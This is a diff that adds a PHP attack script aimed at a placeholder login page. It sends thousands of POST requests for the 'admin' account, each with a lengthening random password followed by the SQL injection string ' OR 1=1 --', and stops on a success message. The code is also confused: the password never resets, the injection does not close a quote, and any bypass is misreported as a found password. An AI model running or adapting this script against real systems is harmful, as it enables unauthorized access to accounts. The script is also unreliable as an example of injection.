@@ -1,0 +1,29 @@
+<?php
+function send_request($url, $data) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
+
+$url = "http://vulnerable_website.com/login.php";
+$username = "admin";
+$password = "";
+
+$sql_injection_payload = " OR 1=1 --";
+
+for ($i = 0; $i < 10000; $i++) {
+    $password .= chr(mt_rand(33, 126));
+    $data = "username=$username&password=$password$sql_injection_payload";
+    $response = send_request($url, $data);
+
+    if (strpos($response, "Login successful") !== false) {
+        echo "Found password: $password\n";
+        break;
+    }
+}
+?>
